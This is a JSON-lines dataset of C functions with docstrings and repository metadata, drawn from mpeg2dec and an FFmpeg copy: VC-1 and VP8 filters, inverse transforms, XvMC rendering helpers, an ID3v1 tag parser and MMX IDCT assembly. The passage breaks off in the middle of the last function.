{"docstring": "/* IMPLEMENTAION specific rouintes */\n", "func_signal": "static void Initialize_Decoder()", "code": "{\n  int i;\n\n  /* Clip table */\n  if (!(Clip=(unsigned char *)malloc(1024)))\n    Error(\"Clip[] malloc failed\\n\");\n\n  Clip += 384;\n\n  for (i=-384; i<640; i++)\n    Clip[i] = (i<0) ? 0 : ((i>255) ? 255 : i);\n\n  /* IDCT */\n  if (Reference_IDCT_Flag)\n    Initialize_Reference_IDCT();\n  else\n    Initialize_Fast_IDCT();\n\n}", "path": "libfbui\\MPEG\\mpeg2dec.c", "repo_name": "8l/fbui", "stars": 125, "license": "None", "language": "c", "size": 739}
{"docstring": "/** Apply overlap transform to vertical edge\n*/\n", "func_signal": "static void vc1_h_overlap_c(uint8_t* src, int stride)", "code": "{\n    int i;\n    int a, b, c, d;\n    int d1, d2;\n    int rnd = 1;\n    for(i = 0; i < 8; i++) {\n        a = src[-2];\n        b = src[-1];\n        c = src[0];\n        d = src[1];\n        d1 = (a - d + 3 + rnd) >> 3;\n        d2 = (a - d + b - c + 4 - rnd) >> 3;\n\n        src[-2] = a - d1;\n        src[-1] = av_clip_uint8(b - d2);\n        src[0] = av_clip_uint8(c + d2);\n        src[1] = d + d1;\n        src += stride;\n        rnd = !rnd;\n    }\n}", "path": "libs\\ffmpeg-git-a5c1a0c\\src\\libavcodec\\vc1dsp.c", "repo_name": "aleksandrm8/ONVIF-Device-Manager", "stars": 74, "license": "None", "language": "c", "size": 36108}
{"docstring": "// high edge variance\n", "func_signal": "static av_always_inline int hev(uint8_t *p, ptrdiff_t stride, int thresh)", "code": "{\n    LOAD_PIXELS\n    return FFABS(p1-p0) > thresh || FFABS(q1-q0) > thresh;\n}", "path": "libs\\ffmpeg-git-a5c1a0c\\src\\libavcodec\\vp8dsp.c", "repo_name": "aleksandrm8/ONVIF-Device-Manager", "stars": 74, "license": "None", "language": "c", "size": 36108}
{"docstring": "/**\n * VC-1 in-loop deblocking filter for one line\n * @param src source block type\n * @param stride block stride\n * @param pq block quantizer\n * @return whether other 3 pairs should be filtered or not\n * @see 8.6\n */\n", "func_signal": "static av_always_inline int vc1_filter_line(uint8_t* src, int stride, int pq)", "code": "{\n    int a0 = (2*(src[-2*stride] - src[ 1*stride]) - 5*(src[-1*stride] - src[ 0*stride]) + 4) >> 3;\n    int a0_sign = a0 >> 31;        /* Store sign */\n    a0 = (a0 ^ a0_sign) - a0_sign; /* a0 = FFABS(a0); */\n    if(a0 < pq){\n        int a1 = FFABS((2*(src[-4*stride] - src[-1*stride]) - 5*(src[-3*stride] - src[-2*stride]) + 4) >> 3);\n        int a2 = FFABS((2*(src[ 0*stride] - src[ 3*stride]) - 5*(src[ 1*stride] - src[ 2*stride]) + 4) >> 3);\n        if(a1 < a0 || a2 < a0){\n            int clip = src[-1*stride] - src[ 0*stride];\n            int clip_sign = clip >> 31;\n            clip = ((clip ^ clip_sign) - clip_sign)>>1;\n            if(clip){\n                int a3 = FFMIN(a1, a2);\n                int d = 5 * (a3 - a0);\n                int d_sign = (d >> 31);\n                d = ((d ^ d_sign) - d_sign) >> 3;\n                d_sign ^= a0_sign;\n\n                if( d_sign ^ clip_sign )\n                    d = 0;\n                else{\n                    d = FFMIN(d, clip);\n                    d = (d ^ d_sign) - d_sign;          /* Restore sign */\n                    src[-1*stride] = av_clip_uint8(src[-1*stride] - d);\n                    src[ 0*stride] = av_clip_uint8(src[ 0*stride] + d);\n                }\n                return 1;\n            }\n        }\n    }\n    return 0;\n}", "path": "libs\\ffmpeg-git-a5c1a0c\\src\\libavcodec\\vc1dsp.c", "repo_name": "aleksandrm8/ONVIF-Device-Manager", "stars": 74, "license": "None", "language": "c", "size": 36108}
{"docstring": "/**\n * Complete frame/field rendering by passing any remaining blocks.\n * Normally ff_draw_horiz_band() is called for each slice, however,\n * some leftover blocks, for example from error_resilience(), may remain.\n * It should be safe to call the function a few times for the same field.\n */\n", "func_signal": "void ff_xvmc_field_end(MpegEncContext *s)", "code": "{\n    struct xvmc_pix_fmt *render = (struct xvmc_pix_fmt*)s->current_picture.f.data[2];\n    assert(render);\n\n    if (render->filled_mv_blocks_num > 0)\n        ff_draw_horiz_band(s, 0, 0);\n}", "path": "libs\\ffmpeg-git-a5c1a0c\\src\\libavcodec\\mpegvideo_xvmc.c", "repo_name": "aleksandrm8/ONVIF-Device-Manager", "stars": 74, "license": "None", "language": "c", "size": 36108}
{"docstring": "/** Do inverse transform on 8x8 block\n*/\n", "func_signal": "static void vc1_inv_trans_8x8_dc_c(uint8_t *dest, int linesize, DCTELEM *block)", "code": "{\n    int i;\n    int dc = block[0];\n    dc = (3 * dc +  1) >> 1;\n    dc = (3 * dc + 16) >> 5;\n    for(i = 0; i < 8; i++){\n        dest[0] = av_clip_uint8(dest[0] + dc);\n        dest[1] = av_clip_uint8(dest[1] + dc);\n        dest[2] = av_clip_uint8(dest[2] + dc);\n        dest[3] = av_clip_uint8(dest[3] + dc);\n        dest[4] = av_clip_uint8(dest[4] + dc);\n        dest[5] = av_clip_uint8(dest[5] + dc);\n        dest[6] = av_clip_uint8(dest[6] + dc);\n        dest[7] = av_clip_uint8(dest[7] + dc);\n        dest += linesize;\n    }\n}", "path": "libs\\ffmpeg-git-a5c1a0c\\src\\libavcodec\\vc1dsp.c", "repo_name": "aleksandrm8/ONVIF-Device-Manager", "stars": 74, "license": "None", "language": "c", "size": 36108}
{"docstring": "/**\n * Find and store the surfaces that are used as reference frames.\n * This function should be called for every new field and/or frame.\n * It should be safe to call the function a few times for the same field.\n */\n", "func_signal": "int ff_xvmc_field_start(MpegEncContext *s, AVCodecContext *avctx)", "code": "{\n    struct xvmc_pix_fmt *last, *next, *render = (struct xvmc_pix_fmt*)s->current_picture.f.data[2];\n    const int mb_block_count = 4 + (1 << s->chroma_format);\n\n    assert(avctx);\n    if (!render || render->xvmc_id != AV_XVMC_ID ||\n        !render->data_blocks || !render->mv_blocks ||\n        (unsigned int)render->allocated_mv_blocks   > INT_MAX/(64*6) ||\n        (unsigned int)render->allocated_data_blocks > INT_MAX/64     ||\n        !render->p_surface) {\n        av_log(avctx, AV_LOG_ERROR,\n               \"Render token doesn't look as expected.\\n\");\n        return -1; // make sure that this is a render packet\n    }\n\n    if (render->filled_mv_blocks_num) {\n        av_log(avctx, AV_LOG_ERROR,\n               \"Rendering surface contains %i unprocessed blocks.\\n\",\n               render->filled_mv_blocks_num);\n        return -1;\n    }\n    if (render->allocated_mv_blocks   < 1 ||\n        render->allocated_data_blocks <  render->allocated_mv_blocks*mb_block_count ||\n        render->start_mv_blocks_num   >= render->allocated_mv_blocks                ||\n        render->next_free_data_block_num >\n                        render->allocated_data_blocks -\n                        mb_block_count*(render->allocated_mv_blocks-render->start_mv_blocks_num)) {\n        av_log(avctx, AV_LOG_ERROR,\n               \"Rendering surface doesn't provide enough block structures to work with.\\n\");\n        return -1;\n    }\n\n    render->picture_structure = s->picture_structure;\n    render->flags             = s->first_field ? 0 : XVMC_SECOND_FIELD;\n    render->p_future_surface  = NULL;\n    render->p_past_surface    = NULL;\n\n    switch(s->pict_type) {\n        case  AV_PICTURE_TYPE_I:\n            return 0; // no prediction from other frames\n        case  AV_PICTURE_TYPE_B:\n            next = (struct xvmc_pix_fmt*)s->next_picture.f.data[2];\n            if (!next)\n                return -1;\n            if (next->xvmc_id != AV_XVMC_ID)\n                return -1;\n            render->p_future_surface = next->p_surface;\n            // no return here, going to set forward prediction\n        case  AV_PICTURE_TYPE_P:\n            last = (struct xvmc_pix_fmt*)s->last_picture.f.data[2];\n            if (!last)\n                last = render; // predict second field from the first\n            if (last->xvmc_id != AV_XVMC_ID)\n                return -1;\n            render->p_past_surface = last->p_surface;\n            return 0;\n    }\n\nreturn -1;\n}", "path": "libs\\ffmpeg-git-a5c1a0c\\src\\libavcodec\\mpegvideo_xvmc.c", "repo_name": "aleksandrm8/ONVIF-Device-Manager", "stars": 74, "license": "None", "language": "c", "size": 36108}
{"docstring": "/**\n * Parse an ID3v1 tag\n *\n * @param buf ID3v1_TAG_SIZE long buffer containing the tag\n */\n", "func_signal": "static int parse_tag(AVFormatContext *s, const uint8_t *buf)", "code": "{\n    char str[5];\n    int genre;\n\n    if (!(buf[0] == 'T' &&\n          buf[1] == 'A' &&\n          buf[2] == 'G'))\n        return -1;\n    get_string(s, \"title\",   buf +  3, 30);\n    get_string(s, \"artist\",  buf + 33, 30);\n    get_string(s, \"album\",   buf + 63, 30);\n    get_string(s, \"date\",    buf + 93,  4);\n    get_string(s, \"comment\", buf + 97, 30);\n    if (buf[125] == 0 && buf[126] != 0) {\n        snprintf(str, sizeof(str), \"%d\", buf[126]);\n        av_dict_set(&s->metadata, \"track\", str, 0);\n    }\n    genre = buf[127];\n    if (genre <= ID3v1_GENRE_MAX)\n        av_dict_set(&s->metadata, \"genre\", ff_id3v1_genre_str[genre], 0);\n    return 0;\n}", "path": "libs\\ffmpeg-git-a5c1a0c\\src\\libavformat\\id3v1.c", "repo_name": "aleksandrm8/ONVIF-Device-Manager", "stars": 74, "license": "None", "language": "c", "size": 36108}
{"docstring": "/** Do inverse transform on 4x8 parts of block\n*/\n", "func_signal": "static void vc1_inv_trans_4x8_dc_c(uint8_t *dest, int linesize, DCTELEM *block)", "code": "{\n    int i;\n    int dc = block[0];\n    dc = (17 * dc +  4) >> 3;\n    dc = (12 * dc + 64) >> 7;\n    for(i = 0; i < 8; i++){\n        dest[0] = av_clip_uint8(dest[0] + dc);\n        dest[1] = av_clip_uint8(dest[1] + dc);\n        dest[2] = av_clip_uint8(dest[2] + dc);\n        dest[3] = av_clip_uint8(dest[3] + dc);\n        dest += linesize;\n    }\n}", "path": "libs\\ffmpeg-git-a5c1a0c\\src\\libavcodec\\vc1dsp.c", "repo_name": "aleksandrm8/ONVIF-Device-Manager", "stars": 74, "license": "None", "language": "c", "size": 36108}
{"docstring": "//===========================================================================//\n", "func_signal": "static int query_format(struct vf_instance *vf, unsigned int fmt)", "code": "{\n    switch(fmt){\n        case IMGFMT_YV12:\n        case IMGFMT_I420:\n        case IMGFMT_IYUV:\n        case IMGFMT_Y800:\n        case IMGFMT_Y8:\n            return vf_next_query_format(vf,fmt);\n    }\n    return 0;\n}", "path": "libs\\ffmpeg-git-a5c1a0c\\src\\libavfilter\\libmpcodecs\\vf_uspp.c", "repo_name": "aleksandrm8/ONVIF-Device-Manager", "stars": 74, "license": "None", "language": "c", "size": 36108}
{"docstring": "/** Filter used to interpolate fractional pel values\n */\n", "func_signal": "static av_always_inline int vc1_mspel_filter(const uint8_t *src, int stride, int mode, int r)", "code": "{\n    switch(mode){\n    case 0: //no shift\n        return src[0];\n    case 1: // 1/4 shift\n        return (-4*src[-stride] + 53*src[0] + 18*src[stride] - 3*src[stride*2] + 32 - r) >> 6;\n    case 2: // 1/2 shift\n        return (-src[-stride] + 9*src[0] + 9*src[stride] - src[stride*2] + 8 - r) >> 4;\n    case 3: // 3/4 shift\n        return (-3*src[-stride] + 18*src[0] + 53*src[stride] - 4*src[stride*2] + 32 - r) >> 6;\n    }\n    return 0; //should not occur\n}", "path": "libs\\ffmpeg-git-a5c1a0c\\src\\libavcodec\\vc1dsp.c", "repo_name": "aleksandrm8/ONVIF-Device-Manager", "stars": 74, "license": "None", "language": "c", "size": 36108}
{"docstring": "/* MMX column IDCT */\n", "func_signal": "static inline void idct_col (int16_t * const col, const int offset)", "code": "{\n#define T1 13036\n#define T2 27146\n#define T3 43790\n#define C4 23170\n\n    DECLARE_ALIGNED(8, static const short, t1_vector)[] = {\n        T1,T1,T1,T1,\n        T2,T2,T2,T2,\n        T3,T3,T3,T3,\n        C4,C4,C4,C4\n    };\n\n    /* column code adapted from Peter Gubanov */\n    /* http://www.elecard.com/peter/idct.shtml */\n\n    __asm__ volatile (\n        \"movq      (%0), %%mm0    \\n\\t\" /* mm0 = T1 */\n\n        \"movq   2*8(%1), %%mm1    \\n\\t\" /* mm1 = x1 */\n        \"movq     %%mm0, %%mm2    \\n\\t\" /* mm2 = T1 */\n\n        \"movq 7*2*8(%1), %%mm4    \\n\\t\" /* mm4 = x7 */\n        \"pmulhw   %%mm1, %%mm0    \\n\\t\" /* mm0 = T1*x1 */\n\n        \"movq    16(%0), %%mm5    \\n\\t\" /* mm5 = T3 */\n        \"pmulhw   %%mm4, %%mm2    \\n\\t\" /* mm2 = T1*x7 */\n\n        \"movq 2*5*8(%1), %%mm6    \\n\\t\" /* mm6 = x5 */\n        \"movq     %%mm5, %%mm7    \\n\\t\" /* mm7 = T3-1 */\n\n        \"movq 3*8*2(%1), %%mm3    \\n\\t\" /* mm3 = x3 */\n        \"psubsw   %%mm4, %%mm0    \\n\\t\" /* mm0 = v17 */\n\n        \"movq     8(%0), %%mm4    \\n\\t\" /* mm4 = T2 */\n        \"pmulhw   %%mm3, %%mm5    \\n\\t\" /* mm5 = (T3-1)*x3 */\n\n        \"paddsw   %%mm2, %%mm1    \\n\\t\" /* mm1 = u17 */\n        \"pmulhw   %%mm6, %%mm7    \\n\\t\" /* mm7 = (T3-1)*x5 */\n\n        /* slot */\n\n        \"movq     %%mm4, %%mm2    \\n\\t\" /* mm2 = T2 */\n        \"paddsw   %%mm3, %%mm5    \\n\\t\" /* mm5 = T3*x3 */\n\n        \"pmulhw 2*8*2(%1), %%mm4  \\n\\t\" /* mm4 = T2*x2 */\n        \"paddsw   %%mm6, %%mm7    \\n\\t\" /* mm7 = T3*x5 */\n\n        \"psubsw   %%mm6, %%mm5    \\n\\t\" /* mm5 = v35 */\n        \"paddsw   %%mm3, %%mm7    \\n\\t\" /* mm7 = u35 */\n\n        \"movq 6*8*2(%1), %%mm3    \\n\\t\" /* mm3 = x6 */\n        \"movq     %%mm0, %%mm6    \\n\\t\" /* mm6 = v17 */\n\n        \"pmulhw   %%mm3, %%mm2    \\n\\t\" /* mm2 = T2*x6 */\n        \"psubsw   %%mm5, %%mm0    \\n\\t\" /* mm0 = b3 */\n\n        \"psubsw   %%mm3, %%mm4    \\n\\t\" /* mm4 = v26 */\n        \"paddsw   %%mm6, %%mm5    \\n\\t\" /* mm5 = v12 */\n\n        \"movq     %%mm0, 3*8*2(%1)\\n\\t\" /* save b3 in scratch0 */\n        \"movq     %%mm1, %%mm6    \\n\\t\" /* mm6 = u17 */\n\n        \"paddsw 2*8*2(%1), %%mm2  \\n\\t\" /* mm2 = u26 */\n        \"paddsw   %%mm7, %%mm6    \\n\\t\" /* mm6 = b0 */\n\n        \"psubsw   %%mm7, %%mm1    \\n\\t\" /* mm1 = u12 */\n        \"movq     %%mm1, %%mm7    \\n\\t\" /* mm7 = u12 */\n\n        \"movq   0*8(%1), %%mm3    \\n\\t\" /* mm3 = x0 */\n        \"paddsw   %%mm5, %%mm1    \\n\\t\" /* mm1 = u12+v12 */\n\n        \"movq    24(%0), %%mm0    \\n\\t\" /* mm0 = C4/2 */\n        \"psubsw   %%mm5, %%mm7    \\n\\t\" /* mm7 = u12-v12 */\n\n        \"movq     %%mm6, 5*8*2(%1)\\n\\t\" /* save b0 in scratch1 */\n        \"pmulhw   %%mm0, %%mm1    \\n\\t\" /* mm1 = b1/2 */\n\n        \"movq     %%mm4, %%mm6    \\n\\t\" /* mm6 = v26 */\n        \"pmulhw   %%mm0, %%mm7    \\n\\t\" /* mm7 = b2/2 */\n\n        \"movq 4*8*2(%1), %%mm5    \\n\\t\" /* mm5 = x4 */\n        \"movq     %%mm3, %%mm0    \\n\\t\" /* mm0 = x0 */\n\n        \"psubsw   %%mm5, %%mm3    \\n\\t\" /* mm3 = v04 */\n        \"paddsw   %%mm5, %%mm0    \\n\\t\" /* mm0 = u04 */\n\n        \"paddsw   %%mm3, %%mm4    \\n\\t\" /* mm4 = a1 */\n        \"movq     %%mm0, %%mm5    \\n\\t\" /* mm5 = u04 */\n\n        \"psubsw   %%mm6, %%mm3    \\n\\t\" /* mm3 = a2 */\n        \"paddsw   %%mm2, %%mm5    \\n\\t\" /* mm5 = a0 */\n\n        \"paddsw   %%mm1, %%mm1    \\n\\t\" /* mm1 = b1 */\n        \"psubsw   %%mm2, %%mm0    \\n\\t\" /* mm0 = a3 */\n\n        \"paddsw   %%mm7, %%mm7    \\n\\t\" /* mm7 = b2 */\n        \"movq     %%mm3, %%mm2    \\n\\t\" /* mm2 = a2 */\n\n        \"movq     %%mm4, %%mm6    \\n\\t\" /* mm6 = a1 */\n        \"paddsw   %%mm7, %%mm3    \\n\\t\" /* mm3 = a2+b2 */\n\n        \"psraw $\" AV_STRINGIFY(COL_SHIFT) \", %%mm3\\n\\t\" /* mm3 = y2 */\n        \"paddsw   %%mm1, %%mm4\\n\\t\" /* mm4 = a1+b1 */\n\n        \"psraw $\" AV_STRINGIFY(COL_SHIFT) \", %%mm4\\n\\t\" /* mm4 = y1 */\n        \"psubsw   %%mm1, %%mm6    \\n\\t\" /* mm6 = a1-b1 */\n\n        \"movq 5*8*2(%1), %%mm1    \\n\\t\" /* mm1 = b0 */\n        \"psubsw   %%mm7, %%mm2    \\n\\t\" /* mm2 = a2-b2 */\n\n        \"psraw $\" AV_STRINGIFY(COL_SHIFT) \", %%mm6\\n\\t\" /* mm6 = y6 */\n        \"movq     %%mm5, %%mm7    \\n\\t\" /* mm7 = a0 */\n\n        \"movq     %%mm4, 1*8*2(%1)\\n\\t\" /* save y1 */\n        \"psraw $\" AV_STRINGIFY(COL_SHIFT) \", %%mm2\\n\\t\" /* mm2 = y5 */\n\n        \"movq     %%mm3, 2*8*2(%1)\\n\\t\" /* save y2 */\n        \"paddsw   %%mm1, %%mm5    \\n\\t\" /* mm5 = a0+b0 */\n\n        \"movq 3*8*2(%1), %%mm4    \\n\\t\" /* mm4 = b3 */\n        \"psubsw   %%mm1, %%mm7    \\n\\t\" /* mm7 = a0-b0 */\n\n        \"psraw $\" AV_STRINGIFY(COL_SHIFT) \", %%mm5\\n\\t\" /* mm5 = y0 */\n        \"movq     %%mm0, %%mm3    \\n\\t\" /* mm3 = a3 */\n\n        \"movq     %%mm2, 5*8*2(%1)\\n\\t\" /* save y5 */\n        \"psubsw   %%mm4, %%mm3    \\n\\t\" /* mm3 = a3-b3 */\n\n        \"psraw $\" AV_STRINGIFY(COL_SHIFT) \", %%mm7\\n\\t\" /* mm7 = y7 */\n        \"paddsw   %%mm0, %%mm4    \\n\\t\" /* mm4 = a3+b3 */\n\n        \"movq     %%mm5, 0*8*2(%1)\\n\\t\" /* save y0 */\n        \"psraw $\" AV_STRINGIFY(COL_SHIFT) \", %%mm3\\n\\t\" /* mm3 = y4 */\n\n        \"movq     %%mm6, 6*8*2(%1)\\n\\t\" /* save y6 */\n        \"psraw $\" AV_STRINGIFY(COL_SHIFT) \", %%mm4\\n\\t\" /* mm4 = y3 */\n\n        \"movq     %%mm7, 7*8*2(%1)\\n\\t\" /* save y7 */\n\n        \"movq     %%mm3, 4*8*2(%1)\\n\\t\" /* save y4 */\n\n        \"movq     %%mm4, 3*8*2(%1)\\n\\t\" /* save y3 */\n        :: \"r\" (t1_vector), \"r\" (col+offset)\n        );\n\n#undef T1\n#undef T2\n#undef T3\n#undef C4\n}", "path": "libs\\ffmpeg-git-a5c1a0c\\src\\libavcodec\\x86\\idct_mmx.c", "repo_name": "aleksandrm8/ONVIF-Device-Manager", "stars": 74, "license": "None", "language": "c", "size": 36108}
{"docstring": "/** Do inverse transform on 4x4 part of block\n*/\n", "func_signal": "static void vc1_inv_trans_4x4_dc_c(uint8_t *dest, int linesize, DCTELEM *block)", "code": "{\n    int i;\n    int dc = block[0];\n    dc = (17 * dc +  4) >> 3;\n    dc = (17 * dc + 64) >> 7;\n    for(i = 0; i < 4; i++){\n        dest[0] = av_clip_uint8(dest[0] + dc);\n        dest[1] = av_clip_uint8(dest[1] + dc);\n        dest[2] = av_clip_uint8(dest[2] + dc);\n        dest[3] = av_clip_uint8(dest[3] + dc);\n        dest += linesize;\n    }\n}", "path": "libs\\ffmpeg-git-a5c1a0c\\src\\libavcodec\\vc1dsp.c", "repo_name": "aleksandrm8/ONVIF-Device-Manager", "stars": 74, "license": "None", "language": "c", "size": 36108}
{"docstring": "/**\n * VC-1 in-loop deblocking filter\n * @param src source block type\n * @param step distance between horizontally adjacent elements\n * @param stride distance between vertically adjacent elements\n * @param len edge length to filter (4 or 8 pixels)\n * @param pq block quantizer\n * @see 8.6\n */\n", "func_signal": "static inline void vc1_loop_filter(uint8_t* src, int step, int stride, int len, int pq)", "code": "{\n    int i;\n    int filt3;\n\n    for(i = 0; i < len; i += 4){\n        filt3 = vc1_filter_line(src + 2*step, stride, pq);\n        if(filt3){\n            vc1_filter_line(src + 0*step, stride, pq);\n            vc1_filter_line(src + 1*step, stride, pq);\n            vc1_filter_line(src + 3*step, stride, pq);\n        }\n        src += step * 4;\n    }\n}", "path": "libs\\ffmpeg-git-a5c1a0c\\src\\libavcodec\\vc1dsp.c", "repo_name": "aleksandrm8/ONVIF-Device-Manager", "stars": 74, "license": "None", "language": "c", "size": 36108}
{"docstring": "/**\n * Fill individual block pointers, so there are no gaps in the data_block array\n * in case not all blocks in the macroblock are coded.\n */\n", "func_signal": "void ff_xvmc_pack_pblocks(MpegEncContext *s, int cbp)", "code": "{\n    int i, j = 0;\n    const int mb_block_count = 4 + (1 << s->chroma_format);\n\n    cbp <<= 12-mb_block_count;\n    for (i = 0; i < mb_block_count; i++) {\n        if (cbp & (1 << 11))\n            s->pblocks[i] = &s->block[j++];\n        else\n            s->pblocks[i] = NULL;\n        cbp += cbp;\n    }\n}", "path": "libs\\ffmpeg-git-a5c1a0c\\src\\libavcodec\\mpegvideo_xvmc.c", "repo_name": "aleksandrm8/ONVIF-Device-Manager", "stars": 74, "license": "None", "language": "c", "size": 36108}
{"docstring": "/**\n * Initialize the block field of the MpegEncContext pointer passed as\n * parameter after making sure that the data is not corrupted.\n * In order to implement something like direct rendering instead of decoding\n * coefficients in s->blocks and then copying them, copy them directly\n * into the data_blocks array provided by xvmc.\n */\n", "func_signal": "void ff_xvmc_init_block(MpegEncContext *s)", "code": "{\n    struct xvmc_pix_fmt *render = (struct xvmc_pix_fmt*)s->current_picture.f.data[2];\n    assert(render && render->xvmc_id == AV_XVMC_ID);\n\n    s->block = (DCTELEM (*)[64])(render->data_blocks + render->next_free_data_block_num * 64);\n}", "path": "libs\\ffmpeg-git-a5c1a0c\\src\\libavcodec\\mpegvideo_xvmc.c", "repo_name": "aleksandrm8/ONVIF-Device-Manager", "stars": 74, "license": "None", "language": "c", "size": 36108}
{"docstring": "/** Do inverse transform on 8x4 part of block\n*/\n", "func_signal": "static void vc1_inv_trans_8x4_dc_c(uint8_t *dest, int linesize, DCTELEM *block)", "code": "{\n    int i;\n    int dc = block[0];\n    dc = ( 3 * dc +  1) >> 1;\n    dc = (17 * dc + 64) >> 7;\n    for(i = 0; i < 4; i++){\n        dest[0] = av_clip_uint8(dest[0] + dc);\n        dest[1] = av_clip_uint8(dest[1] + dc);\n        dest[2] = av_clip_uint8(dest[2] + dc);\n        dest[3] = av_clip_uint8(dest[3] + dc);\n        dest[4] = av_clip_uint8(dest[4] + dc);\n        dest[5] = av_clip_uint8(dest[5] + dc);\n        dest[6] = av_clip_uint8(dest[6] + dc);\n        dest[7] = av_clip_uint8(dest[7] + dc);\n        dest += linesize;\n    }\n}", "path": "libs\\ffmpeg-git-a5c1a0c\\src\\libavcodec\\vc1dsp.c", "repo_name": "aleksandrm8/ONVIF-Device-Manager", "stars": 74, "license": "None", "language": "c", "size": 36108}
{"docstring": "/**\n * E - limit at the macroblock edge\n * I - limit for interior difference\n */\n", "func_signal": "static av_always_inline int normal_limit(uint8_t *p, ptrdiff_t stride, int E, int I)", "code": "{\n    LOAD_PIXELS\n    return simple_limit(p, stride, E)\n        && FFABS(p3-p2) <= I && FFABS(p2-p1) <= I && FFABS(p1-p0) <= I\n        && FFABS(q3-q2) <= I && FFABS(q2-q1) <= I && FFABS(q1-q0) <= I;\n}", "path": "libs\\ffmpeg-git-a5c1a0c\\src\\libavcodec\\vp8dsp.c", "repo_name": "aleksandrm8/ONVIF-Device-Manager", "stars": 74, "license": "None", "language": "c", "size": 36108}
{"docstring": "/** Apply overlap transform to horizontal edge\n*/\n", "func_signal": "static void vc1_v_overlap_c(uint8_t* src, int stride)", "code": "{\n    int i;\n    int a, b, c, d;\n    int d1, d2;\n    int rnd = 1;\n    for(i = 0; i < 8; i++) {\n        a = src[-2*stride];\n        b = src[-stride];\n        c = src[0];\n        d = src[stride];\n        d1 = (a - d + 3 + rnd) >> 3;\n        d2 = (a - d + b - c + 4 - rnd) >> 3;\n\n        src[-2*stride] = a - d1;\n        src[-stride] = av_clip_uint8(b - d2);\n        src[0] = av_clip_uint8(c + d2);\n        src[stride] = d + d1;\n        src++;\n        rnd = !rnd;\n    }\n}", "path": "libs\\ffmpeg-git-a5c1a0c\\src\\libavcodec\\vc1dsp.c", "repo_name": "aleksandrm8/ONVIF-Device-Manager", "stars": 74, "license": "None", "language": "c", "size": 36108}
{"docstring": "/* C column IDCT - it is just here to document the MMXEXT and MMX versions */\n", "func_signal": "static inline void idct_col (int16_t * col, int offset)", "code": "{\n/* multiplication - as implemented on mmx */\n#define F(c,x) (((c) * (x)) >> 16)\n\n/* saturation - it helps us handle torture test cases */\n#define S(x) (((x)>32767) ? 32767 : ((x)<-32768) ? -32768 : (x))\n\n    int16_t x0, x1, x2, x3, x4, x5, x6, x7;\n    int16_t y0, y1, y2, y3, y4, y5, y6, y7;\n    int16_t a0, a1, a2, a3, b0, b1, b2, b3;\n    int16_t u04, v04, u26, v26, u17, v17, u35, v35, u12, v12;\n\n    col += offset;\n\n    x0 = col[0*8];\n    x1 = col[1*8];\n    x2 = col[2*8];\n    x3 = col[3*8];\n    x4 = col[4*8];\n    x5 = col[5*8];\n    x6 = col[6*8];\n    x7 = col[7*8];\n\n    u04 = S (x0 + x4);\n    v04 = S (x0 - x4);\n    u26 = S (F (T2, x6) + x2);\n    v26 = S (F (T2, x2) - x6);\n\n    a0 = S (u04 + u26);\n    a1 = S (v04 + v26);\n    a2 = S (v04 - v26);\n    a3 = S (u04 - u26);\n\n    u17 = S (F (T1, x7) + x1);\n    v17 = S (F (T1, x1) - x7);\n    u35 = S (F (T3, x5) + x3);\n    v35 = S (F (T3, x3) - x5);\n\n    b0 = S (u17 + u35);\n    b3 = S (v17 - v35);\n    u12 = S (u17 - u35);\n    v12 = S (v17 + v35);\n    u12 = S (2 * F (C4, u12));\n    v12 = S (2 * F (C4, v12));\n    b1 = S (u12 + v12);\n    b2 = S (u12 - v12);\n\n    y0 = S (a0 + b0) >> COL_SHIFT;\n    y1 = S (a1 + b1) >> COL_SHIFT;\n    y2 = S (a2 + b2) >> COL_SHIFT;\n    y3 = S (a3 + b3) >> COL_SHIFT;\n\n    y4 = S (a3 - b3) >> COL_SHIFT;\n    y5 = S (a2 - b2) >> COL_SHIFT;\n    y6 = S (a1 - b1) >> COL_SHIFT;\n    y7 = S (a0 - b0) >> COL_SHIFT;\n\n    col[0*8] = y0;\n    col[1*8] = y1;\n    col[2*8] = y2;\n    col[3*8] = y3;\n    col[4*8] = y4;\n    col[5*8] = y5;\n    col[6*8] = y6;\n    col[7*8] = y7;\n}", "path": "libs\\ffmpeg-git-a5c1a0c\\src\\libavcodec\\x86\\idct_mmx.c", "repo_name": "aleksandrm8/ONVIF-Device-Manager", "stars": 74, "license": "None", "language": "c", "size": 36108}
{"docstring": "/**\n * Synthesize the data needed by XvMC to render one macroblock of data.\n * Fill all relevant fields, if necessary do IDCT.\n */\n", "func_signal": "void ff_xvmc_decode_mb(MpegEncContext *s)", "code": "{\n    XvMCMacroBlock *mv_block;\n    struct xvmc_pix_fmt *render;\n    int i, cbp, blocks_per_mb;\n\n    const int mb_xy = s->mb_y * s->mb_stride + s->mb_x;\n\n\n    if (s->encoding) {\n        av_log(s->avctx, AV_LOG_ERROR, \"XVMC doesn't support encoding!!!\\n\");\n        return;\n    }\n\n    // from MPV_decode_mb(), update DC predictors for P macroblocks\n    if (!s->mb_intra) {\n        s->last_dc[0] =\n        s->last_dc[1] =\n        s->last_dc[2] =  128 << s->intra_dc_precision;\n    }\n\n    // MC doesn't skip blocks\n    s->mb_skipped = 0;\n\n\n    // Do I need to export quant when I could not perform postprocessing?\n    // Anyway, it doesn't hurt.\n    s->current_picture.f.qscale_table[mb_xy] = s->qscale;\n\n    // start of XVMC-specific code\n    render = (struct xvmc_pix_fmt*)s->current_picture.f.data[2];\n    assert(render);\n    assert(render->xvmc_id == AV_XVMC_ID);\n    assert(render->mv_blocks);\n\n    // take the next free macroblock\n    mv_block = &render->mv_blocks[render->start_mv_blocks_num +\n                                  render->filled_mv_blocks_num];\n\n    mv_block->x        = s->mb_x;\n    mv_block->y        = s->mb_y;\n    mv_block->dct_type = s->interlaced_dct; // XVMC_DCT_TYPE_FRAME/FIELD;\n    if (s->mb_intra) {\n        mv_block->macroblock_type = XVMC_MB_TYPE_INTRA; // no MC, all done\n    } else {\n        mv_block->macroblock_type = XVMC_MB_TYPE_PATTERN;\n\n        if (s->mv_dir & MV_DIR_FORWARD) {\n            mv_block->macroblock_type |= XVMC_MB_TYPE_MOTION_FORWARD;\n            // PMV[n][dir][xy] = mv[dir][n][xy]\n            mv_block->PMV[0][0][0] = s->mv[0][0][0];\n            mv_block->PMV[0][0][1] = s->mv[0][0][1];\n            mv_block->PMV[1][0][0] = s->mv[0][1][0];\n            mv_block->PMV[1][0][1] = s->mv[0][1][1];\n        }\n        if (s->mv_dir & MV_DIR_BACKWARD) {\n            mv_block->macroblock_type |= XVMC_MB_TYPE_MOTION_BACKWARD;\n            mv_block->PMV[0][1][0] = s->mv[1][0][0];\n            mv_block->PMV[0][1][1] = s->mv[1][0][1];\n            